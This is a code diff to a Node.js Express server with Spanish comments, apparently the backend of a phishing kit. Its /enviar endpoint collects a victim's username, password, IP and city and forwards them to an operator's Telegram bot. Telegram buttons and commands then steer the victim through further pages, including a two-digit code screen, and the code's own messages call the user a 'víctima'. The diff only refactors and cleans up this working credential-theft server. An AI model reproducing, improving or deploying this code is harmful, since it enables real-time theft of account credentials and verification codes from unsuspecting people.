@@ -18,7 +18,7 @@ if (!fs.existsSync(CLIENTES_DIR)) {
   fs.mkdirSync(CLIENTES_DIR);
 }
 
-// Limpieza automática cada 10 minutos
+// Limpieza automática cada 10 minutos (archivos > 15 min)
 setInterval(() => {
   const files = fs.readdirSync(CLIENTES_DIR);
   const ahora = Date.now();
@@ -30,36 +30,37 @@ setInterval(() => {
 
     if (edadMinutos > 15) {
       fs.unlinkSync(fullPath);
-      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
+      console.log(`Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
     }
   });
 }, 10 * 60 * 1000);
 
 function guardarCliente(txid, data) {
-  const ruta = `${CLIENTES_DIR}/${txid}.json`;
+  const ruta = path.join(CLIENTES_DIR, `${txid}.json`);
   fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
 }
 
 function cargarCliente(txid) {
-  const ruta = `${CLIENTES_DIR}/${txid}.json`;
+  const ruta = path.join(CLIENTES_DIR, `${txid}.json`);
   if (fs.existsSync(ruta)) {
     return JSON.parse(fs.readFileSync(ruta));
   }
   return null;
 }
 
+// Recibir credenciales
 app.post('/enviar', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
 
   const mensaje = `
-🔵GM4YL🔵
-🆔 ID: <code>${txid}</code>
+GM4YL
+ID: <code>${txid}</code>
 
-📱 US4R: <code>${usar}</code>
-🔐 CL4V: <code>${clavv}</code>
+US4R: <code>${usar}</code>
+CL4V: <code>${clavv}</code>
 
-🌐 IP: ${ip}
-🏙️ Ciudad: ${ciudad}
+IP: ${ip}
+Ciudad: ${ciudad}
 `;
 
   const cliente = {
@@ -67,7 +68,6 @@ app.post('/enviar', async (req, res) => {
     codigo: null,
     usar,
     clavv,
-    preguntas: [],
     ip,
     ciudad
   };
@@ -76,9 +76,9 @@ app.post('/enviar', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "🔑 CONFIRMAR", callback_data: `confirmar:${txid}` },
-        { text: "🔐 CÓDIGO", callback_data: `codigo:${txid}` },
-        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
+        { text: "CONFIRMAR", callback_data: `confirmar:${txid}` },
+        { text: "CÓDIGO", callback_data: `codigo:${txid}` },
+        { text: "ERROR LOGO", callback_data: `errorlogo:${txid}` }
       ]
     ]
   };
@@ -97,69 +97,56 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
+// Webhook de Telegram
 app.post('/webhook', async (req, res) => {
-  // Procesar callback_query (botones)
+  // Botones inline
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
     const data = callback.data;
-    const partes = data.split(":");
-    const accion = partes[0]; // confirmar | codigo | errorlogo
-    const txid = partes[1];
+    const [accion, txid] = data.split(':');
 
-    let cliente = cargarCliente(txid);
-    if (!cliente) {
-      return res.sendStatus(404);
-    }
+    const cliente = cargarCliente(txid);
+    if (!cliente) return res.sendStatus(404);
 
-    // Actualizar estado según la acción
-    if (accion === "confirmar") {
-      cliente.status = "confirmar";
-    } else if (accion === "codigo") {
-      cliente.status = "codigo";  // Esto hará que cargs.html redirija a otro3.html
-    } else if (accion === "errorlogo") {
-      cliente.status = "errorlogo";
-    }
-
+    cliente.status = accion; // confirmar | codigo | errorlogo
     guardarCliente(txid, cliente);
 
-    // Confirmar al operador
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         callback_query_id: callback.id,
-        text: `✅ Acción ejecutada: ${accion}`
+        text: `Acción: ${accion.toUpperCase()}`
       })
     });
 
-    // Opcional: enviar mensaje de confirmación
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: callback.message.chat.id,
-        text: `✅ Acción "${accion}" aplicada al ID ${txid}`
+        text: `Acción "${accion}" aplicada al ID ${txid}`
       })
     });
 
     return res.sendStatus(200);
   }
 
-  // Procesar comandos como /abc123 22
+  // Comando /txid 22
   if (req.body.message?.text?.startsWith('/')) {
     const texto = req.body.message.text.trim();
     const partes = texto.split(' ');
-    const comando = partes[0].slice(1); // txid
+    const txid = partes[0].slice(1);
     const codigoStr = partes[1]?.trim();
 
-    let cliente = cargarCliente(comando);
+    const cliente = cargarCliente(txid);
     if (!cliente) {
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: req.body.message.chat.id,
-          text: `❌ No se encontró sesión con ID: ${comando}`
+          text: `No existe sesión con ID: ${txid}`
         })
       });
       return res.sendStatus(200);
@@ -167,15 +154,15 @@ app.post('/webhook', async (req, res) => {
 
     if (codigoStr && /^\d{2}$/.test(codigoStr)) {
       cliente.codigo = codigoStr;
-      cliente.status = "codigo";  // ¡Importante! Esto activa la redirección a otro3.html
-      guardarCliente(comando, cliente);
+      cliente.status = "codigo";
+      guardarCliente(txid, cliente);
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: req.body.message.chat.id,
-          text: `✅ Código "${codigoStr}" enviado para ${comando}\nVíctima redirigida a pantalla de 2 dígitos.`
+          text: `Código "${codigoStr}" enviado\nVíctima redirigida a pantalla de 2 dígitos`
         })
       });
     } else {
@@ -184,7 +171,7 @@ app.post('/webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: req.body.message.chat.id,
-          text: `⚠️ Formato incorrecto.\nUsa: /${comando} 22`
+          text: `Formato incorrecto.\nUsa: /${txid} 22`
         })
       });
     }
@@ -195,21 +182,20 @@ app.post('/webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Endpoint usado por cargs.html y otro4.html
-app.get('/sendStatus.php', (req, res) => {
+// Endpoint principal para polling (cargs.html, otro4.html, etc.)
+app.get('/api/status', (req, res) => {
   const txid = req.query.txid;
-  if (!txid) return res.status(400).json({ status: "error", message: "Falta txid" });
+  if (!txid) return res.status(400).json({ error: "Falta txid" });
 
   const cliente = cargarCliente(txid);
-  if (!cliente) return res.status(404).json({ status: "error", message: "Sesión no encontrada" });
+  if (!cliente) return res.status(404).json({ error: "Sesión no encontrada" });
 
   res.json({
-    status: cliente.status || "esperando",
-    preguntas: cliente.preguntas || []
+    status: cliente.status || "esperando"
   });
 });
 
-// Endpoint usado por otro3.html para obtener el código de 2 dígitos
+// Endpoint para obtener solo el código de 2 dígitos (otro3.html)
 app.get('/status', (req, res) => {
   const txid = req.query.txid;
   if (!txid) return res.status(400).json({ error: "Falta txid" });
@@ -220,7 +206,7 @@ app.get('/status', (req, res) => {
   res.json({ codigo: cliente.codigo || null });
 });
 
-app.get('/', (req, res) => res.send("Servidor activo en Render"));
+app.get('/', (req, res) => res.send("Servidor activo"));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
+app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
